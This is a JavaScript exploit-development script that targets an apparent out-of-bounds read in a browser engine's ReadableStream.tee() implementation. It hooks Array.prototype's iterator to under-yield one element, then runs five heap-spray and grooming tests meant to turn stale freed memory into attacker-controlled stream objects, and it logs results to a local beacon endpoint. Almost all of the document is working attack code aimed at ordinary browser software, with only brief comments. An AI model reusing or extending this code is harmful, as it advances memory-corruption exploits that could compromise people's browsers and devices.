/*
 * p434 -- tee() OOB heap grooming
 *
 * Under-yield (1 element) causes results[1] to read 8 bytes past
 * the Vector<Strong<JSObject>> data buffer. The buffer is 8 bytes
 * (1 HandleSlot), allocated via fastMalloc -> bmalloc 16-byte class.
 * Offset +8 is within the 16-byte allocation's second half.
 *
 * Strong<JSObject> stores a HandleSlot (JSValue*). When the previous
 * Vector was freed, the Strongs were destroyed (HandleSlots returned
 * to HandleSet), but the RAW BYTES remain in the freed 16-byte block.
 *
 * Strategy:
 *   Phase A: Warm-up -- do N normal tees, keep refs alive.
 *     Each tee creates a 16-byte Vector, freed after convert().
 *     The freed blocks go to bmalloc's 16-byte free list.
 *     Their offset +8 = old HandleSlot for branch2.
 *   Phase B: Reclaim HandleSlots -- create objects that allocate
 *     new HandleSlots, potentially reusing the freed ones.
 *     The reused HandleSlots now point to our target objects.
 *   Phase C: Under-yield tee -- Vector reuses a freed 16-byte block.
 *     offset +8 = old HandleSlot address. If that HandleSlot was
 *     reclaimed in Phase B, it points to our target.
 *   Phase D: Check if results[1] wraps our target -> getReader etc.
 *
 * Tests:
 *   T1: Baseline -- normal tee, no spray, check timing
 *   T2: Spray-then-underyield -- 50 normal tees, then underyield
 *   T3: Spray 200, underyield
 *   T4: Spray + trigger GC via large alloc + underyield
 *   T5: Spray + free some intermediates + underyield
 *
 * Beacon prefix: V434-
 */
(function(){
"use strict";
var BQ = 0;
function B(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open("POST", "/beacon/V435-" + tag + "?q=" + (BQ++), false);
    x.setRequestHeader("Content-Type", "text/plain");
    x.send(typeof data === "object" ? JSON.stringify(data) : String(data || ""));
  } catch(e) {}
}

B("BOOT");

var origIter = Array.prototype[Symbol.iterator];

function makeStream(data) {
  return new ReadableStream({
    start: function(c) {
      if (Array.isArray(data)) {
        for (var i = 0; i < data.length; i++) c.enqueue(data[i]);
      } else c.enqueue(data || "x");
      c.close();
    }
  });
}

// Normal tee -- captures internals, returns branches
function normalTee(data) {
  var rs = makeStream(data);
  var internals = null;
  var hooked = false;

  Array.prototype[Symbol.iterator] = function() {
    var self = this;
    if (Array.isArray(self) && self.length === 2 && !hooked) {
      if (typeof self[0] === "object" && self[0] !== null && !(self[0] instanceof ReadableStream)) {
        hooked = true;
        internals = {b1: self[0], b2: self[1]};
      }
    }
    return origIter.call(self);
  };

  try {
    var branches = rs.tee();
    Array.prototype[Symbol.iterator] = origIter;
    return {branches: branches, internals: internals};
  } catch(e) {
    Array.prototype[Symbol.iterator] = origIter;
    return null;
  }
}

// Under-yield tee -- returns 1 element, results[1] reads OOB
function underYieldTee(data) {
  var rs = makeStream(data);
  var hooked = false;
  var capturedB1 = null;

  Array.prototype[Symbol.iterator] = function() {
    var self = this;
    if (Array.isArray(self) && self.length === 2 && !hooked) {
      if (typeof self[0] === "object" && self[0] !== null && !(self[0] instanceof ReadableStream)) {
        hooked = true;
        capturedB1 = self[0];
        var items = [self[0]]; // only 1 element
        var idx = 0;
        return {
          next: function() {
            if (idx < items.length) return {value: items[idx++], done: false};
            return {done: true};
          }
        };
      }
    }
    return origIter.call(self);
  };

  try {
    var branches = rs.tee();
    Array.prototype[Symbol.iterator] = origIter;
    // branches[0] = fromObject(capturedB1)
    // branches[1] = fromObject(OOB read at results[1])
    return {branches: branches, b1: capturedB1, hooked: hooked};
  } catch(e) {
    Array.prototype[Symbol.iterator] = origIter;
    return {err: e.message.slice(0, 80), hooked: hooked};
  }
}

// Probe what we got from the OOB read
function probeOOB(label, result) {
  if (result.err) {
    B(label + "-ERR", result.err);
    return;
  }
  if (!result.branches || !result.branches[1]) {
    B(label + "-NULL", "branch1 null or undefined");
    return;
  }

  var b1 = result.branches[1];

  // Basic type info
  try {
    B(label + "-TYPE", {
      type: typeof b1,
      ctor: b1.constructor ? b1.constructor.name : "?",
      isRS: b1 instanceof ReadableStream
    });
  } catch(e) {
    B(label + "-TYPE-ERR", e.message.slice(0, 60));
    return;
  }

  // Try .locked (reads "reader" private slot -- undefined = false, no crash)
  try {
    var locked = b1.locked;
    B(label + "-LOCKED", {val: locked});
  } catch(e) {
    B(label + "-LOCKED-ERR", e.message.slice(0, 60));
  }

  // Try getReader
  try {
    var reader = b1.getReader();
    B(label + "-READER-OK!!!");

    reader.read().then(function(r) {
      B(label + "-READ", {done: r.done, val: r.value === undefined ? "undef" : String(r.value).slice(0, 60)});
      reader.releaseLock();
    }).catch(function(e) {
      B(label + "-READ-ERR", e.message.slice(0, 60));
    });
  } catch(e) {
    B(label + "-READER-ERR", e.message.slice(0, 60));
  }
}

// ================================================================
// T1: Baseline under-yield (no spray) -- expect crash or null
// ================================================================
function T1() {
  B("T1-START");
  var r = underYieldTee("t1-data");
  probeOOB("T1", r);
}

// ================================================================
// T2: Spray 50 normal tees, then under-yield
// Keep all tee results alive to prevent GC of branch2 objects
// ================================================================
function T2() {
  B("T2-START");

  var tees = [];
  for (var i = 0; i < 50; i++) {
    var t = normalTee("spray-" + i);
    if (t) tees.push(t);
  }
  B("T2-SPRAYED", tees.length);

  // Now under-yield -- Vector allocation should reuse a freed 16-byte block
  // offset +8 might have a stale HandleSlot from one of the spray tees
  var r = underYieldTee("t2-data");
  probeOOB("T2", r);

  // Keep tees alive
  B("T2-ALIVE", tees.length);
}

// ================================================================
// T3: Spray 200 normal tees
// More spray = more freed blocks = higher chance of reuse
// ================================================================
function T3() {
  B("T3-START");

  var tees = [];
  for (var i = 0; i < 200; i++) {
    var t = normalTee("s3-" + i);
    if (t) tees.push(t);
  }
  B("T3-SPRAYED", tees.length);

  var r = underYieldTee("t3-data");
  probeOOB("T3", r);

  B("T3-ALIVE", tees.length);
}

// ================================================================
// T4: Spray + GC pressure + under-yield
// Allocate large ArrayBuffers to trigger GC, which might compact the heap
// ================================================================
function T4() {
  B("T4-START");

  var tees = [];
  for (var i = 0; i < 100; i++) {
    var t = normalTee("s4-" + i);
    if (t) tees.push(t);
  }

  // GC pressure: allocate and release large buffers
  for (var i = 0; i < 20; i++) {
    try { new ArrayBuffer(1024 * 1024); } catch(e) {}
  }

  B("T4-SPRAYED", tees.length);

  var r = underYieldTee("t4-data");
  probeOOB("T4", r);

  B("T4-ALIVE", tees.length);
}

// ================================================================
// T5: Spray, release half, spray again with different data, under-yield
// Tries to control what's in the freed HandleSlots
// ================================================================
function T5() {
  B("T5-START");

  // Phase 1: Spray
  var tees = [];
  for (var i = 0; i < 100; i++) {
    var t = normalTee("phase1-" + i);
    if (t) tees.push(t);
  }

  // Phase 2: Release alternating to create holes
  for (var i = 0; i < tees.length; i += 2) {
    tees[i] = null; // release branch refs -> internal streams may be GC'd
  }

  // Phase 3: GC nudge
  for (var i = 0; i < 10; i++) {
    try { new ArrayBuffer(2 * 1024 * 1024); } catch(e) {}
  }

  // Phase 4: Spray again -- new tees reuse freed HandleSlots
  var tees2 = [];
  for (var i = 0; i < 100; i++) {
    var t = normalTee("phase2-" + i);
    if (t) tees2.push(t);
  }

  B("T5-SPRAYED", {phase1: tees.length, phase2: tees2.length});

  // Phase 5: Under-yield
  var r = underYieldTee("t5-data");
  probeOOB("T5", r);

  // Keep phase2 alive
  B("T5-ALIVE", tees2.length);
}

// Run tests with delays to let microtasks/GC settle
// T1 is the crash oracle -- if it crashes, subsequent tests don't run
// Put the dangerous one LAST
var schedule = [
  function() { T2(); },
  function() { T3(); },
  function() { T4(); },
  function() { T5(); },
  function() { T1(); } // crash oracle last
];

var idx = 0;
function runNext() {
  if (idx >= schedule.length) {
    B("DONE", "all-tests-complete");
    return;
  }
  try { schedule[idx](); }
  catch(e) { B("SCHEDULE-ERR-" + idx, e.message.slice(0, 80)); }
  idx++;
  setTimeout(runNext, 800);
}

setInterval(function() { B("HB", "hb"); }, 15000);
setTimeout(runNext, 200);
})();
